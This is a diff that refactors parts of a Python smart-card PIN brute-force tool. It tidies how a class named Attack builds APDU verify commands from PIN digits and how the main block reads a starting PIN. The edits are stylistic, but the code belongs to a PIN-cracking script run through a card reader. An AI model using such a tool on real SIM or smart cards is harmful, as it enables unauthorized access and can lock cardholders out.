@@ -83,21 +83,11 @@ class Attack:
         B = 0x30 + int(N[1])
         C = 0x30 + int(N[2])
         D = 0x30 + int(N[3])
-        E = 0xFF
-        F = 0xFF
-        G = 0xFF
-        H = 0xFF
-
-        if l > 4:
-            E = 0x30 + int(N[4])
-        if l > 5:
-            F = 0x30 + int(N[5])
-        if l > 6:
-            G = 0x30 + int(N[6])
-        if l > 7:
-            H = 0x30 + int(N[7])
-
-        COMM = [
+        E = 0x30 + int(N[4]) if l > 4 else 0xFF
+        F = 0x30 + int(N[5]) if l > 5 else 0xFF
+        G = 0x30 + int(N[6]) if l > 6 else 0xFF
+        H = 0x30 + int(N[7]) if l > 7 else 0xFF
+        return [
             0xA0,
             0x20,
             0x00,
@@ -111,9 +101,7 @@ class Attack:
             F,
             G,
             H,
-        ]  # APDU with command pkt
-
-        return COMM
+        ]
 
     def crack_pin(self):
         """The function just forms a APDU with the pin then sends it to the reader and waits for the status."""
@@ -186,12 +174,7 @@ if __name__ == "__main__":
     connection = r[0].createConnection()
     connection.connect()
 
-    if args.startpin:
-        # n= 00274710
-        n = int(args.startpin)
-    else:
-        n = 0
-
+    n = int(args.startpin) if args.startpin else 0
     if args.lenght:
         if 4 <= int(args.lenght) <= 8:
             l = int(args.lenght)
